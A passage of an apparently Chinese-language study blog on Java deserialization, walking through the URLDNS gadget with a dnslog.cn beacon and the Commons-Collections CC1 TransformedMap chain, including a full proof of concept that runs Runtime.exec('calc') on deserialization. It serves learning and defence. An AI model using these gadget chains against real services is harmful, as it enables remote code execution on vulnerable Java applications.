<span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">       <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://7gjq24.dnslog.cn&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">       f.setAccessible(<span class="literal">true</span>); <span class="comment">// 绕过Java语言权限控制检查的权限</span></span><br><span class="line">       f.set(url,<span class="number">123</span>); <span class="comment">// 设置hashcode的值为-1的其他任何数字</span></span><br><span class="line">       System.out.println(url.hashCode());</span><br><span class="line">       map.put(url,<span class="number">123</span>); <span class="comment">// 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询</span></span><br><span class="line">       f.set(url,-<span class="number">1</span>); <span class="comment">// 将hashcode重新设置为-1，确保在反序列化成功触发</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">           <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line"></span><br><span class="line">           outputStream.writeObject(map);</span><br><span class="line">           outputStream.close();</span><br><span class="line">           fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">           <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">           <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">           inputStream.readObject();</span><br><span class="line">           inputStream.close();</span><br><span class="line">           fileInputStream.close();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>我们可以发现在进行put之前URL对象之前我们反射修改了其hashcode的值，这是为什么呢，是因为在序列化的时候writeobject 会写入key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">buckets</span> <span class="operator">=</span> capacity();</span><br><span class="line">        <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeInt(buckets);</span><br><span class="line">        s.writeInt(size);</span><br><span class="line">        internalWriteEntries(s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">internalWriteEntries</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      Node&lt;K,V&gt;[] tab;</span><br><span class="line">      <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tab.length; ++i) &#123;</span><br><span class="line">              <span class="keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">                  s.writeObject(e.key);</span><br><span class="line">                  s.writeObject(e.value);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现这里的key以及value是从tab中取的，而tab的值即HashMap中table的值。此时我们如果想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNStest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://razgbd.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">//此时会产生dns查询</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以要想不在put的时候发起dns请求需要反射修改其hashcode的值让其不为-1即可因为不为-1会直接返回hashcode的值不会进行后续的调用</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714232350597-a9d56e20-f65f-424e-98f4-2d6a0a232f99.png" alt=""></p><p>那ysoserial在put时是怎么不触发dns请求的呢调试一下：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714235280291-9d23edfb-4a62-48ec-b317-73c2783170c9.png" alt=""></p><p>在调用到箭头所指向的方法时其返回一个null值，从而不触发dns请求<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714235322122-f98710a8-b5f4-4c17-bb18-8335d5bc7b9e.png" alt=""></p><p>那为什么反序列化时又能够发起请求了呢是因为URL类中handler被设置为 transient（当一个字段被声明为 transient 时，表示该字段不会参与对象的序列化过程，即在将对象转换为字节流以便进行存储或传输时，这些字段的值不会被包含在序列化的结果中。）<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714235649137-224edc64-5083-4337-839c-86b8ceaf2395.png" alt=""></p><p>所以反序列化可以触发dns请求</p><p>参考：<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631738506-bbe121c1-93dc-46af-bbf1-f404742d8cf6.pdf">Java安全漫谈 - 09.反序列化篇(3).pdf</a></p><h2 id="3-java-cc1链-TranformedMap">3.java cc1链-TranformedMap</h2><p>复习一遍之前学过的，由于太过久远导致基本全部忘记了，还有就是当时的笔记记得太过于潦草导致根本没法复习。</p><p>这次重新跟一遍cc1链。</p><h3 id="3-1环境搭建">3.1环境搭建</h3><p>具体搭建可以参考bilibili的白日梦组长。</p><p>就是将下载jdk  8u71以下的版本，然后在下载对应的openjdk将里面的sun包复制过来，然后注意Commons-Collections的版本为3.2.1。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-2函数介绍">3.2函数介绍</h3><h4 id="3-2-1Transformer">3.2.1Transformer</h4><p>Transformer是一个接口，只有一个带实现的方法；<br>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个“回调<br>函数”，这个回调的参数是原始对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-2InvokerTransformer">3.2.2InvokerTransformer</h4><p><font style="color:rgb(51, 51, 51);">InvokerTransformer是实现了Transformer、Serializable接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序<br></font>列化能执⾏任意代码的关键；</p><p>在实例化这个InvokerTransformer时，需要传⼊三个参数：</p><ul><li>第⼀个参数是待执⾏的⽅法名</li><li>第⼆个参数是这个函数的参数列表的参数类型</li><li>第三个参数是传给这个函数的参数列表</li></ul><p>后面transform方法，通过反射调用执行了input对象的iMethodName方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-3ChainedTransformer">3.2.3ChainedTransformer</h4><p>ChainedTransformer是实现了Transformer、Serializable接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起，将前一个回调返回的结果作为后一个的参数传入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-4ConstantTransformer">3.2.4ConstantTransformer</h4><p>ConstantTransformer是实现了Transformer、Serializable接口的一个类，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回；</p><p>作用就是包装任意一个对象，在执行回调时返回这个对象，进而方便后续操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-2-5Transfomed">3.2.5Transfomed</h4><p>TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">        key = transformKey(key);</span><br><span class="line">        value = transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">putAll</span><span class="params">(Map mapToCopy)</span> &#123;</span><br><span class="line">        mapToCopy = transformMap(mapToCopy);</span><br><span class="line">        getMap().putAll(mapToCopy);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="3-3调用链过程">3.3调用链过程</h3><p>先来看一下Transfomed的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        //正常获取runtime实例</span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//        //反射获取 runtime实例,并执行代码</span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;, null);</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) getRuntimeMethod.invoke(null, null);</span></span><br><span class="line"><span class="comment">//        Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(runtime,&quot;calc&quot;);</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//        //InvokerTransformer方法获取runtime实例，并执行代码</span></span><br><span class="line"><span class="comment">//        Method  getRuntimeMethod = (Method) new InvokerTransformer(&quot;getRuntime&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">//通过ChainedTransformer实现 InvokerTransformer方法获取runtime实例，并执行代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">//创建构造器</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//保证可以访问到</span></span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//实例化传参，注解和构造好的Map</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"> </span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实通过上面的函数介绍可以知道invokerTransformer中的transform方法就是一个可以调用任意类中的方法的一个函数，所以它在这里算是我们反序列化最终执行的点来进行恶意操作。那么下面我们就需要找到一个谁调用了这个transform方法，我们可以在序列化的时候将调用这个方法的对象给改成invokerTransformer对象</p><p>所以第一步我们找到了一个调用该方法的函数是TransformedMap中的CheckSetValue方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714487775144-4f98f606-3add-4d77-ad37-f4daee4d213b.png" alt=""></p><p>通过对该类的构造方法的分析可以看到我们可以传入三个参数具体如下代码所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span 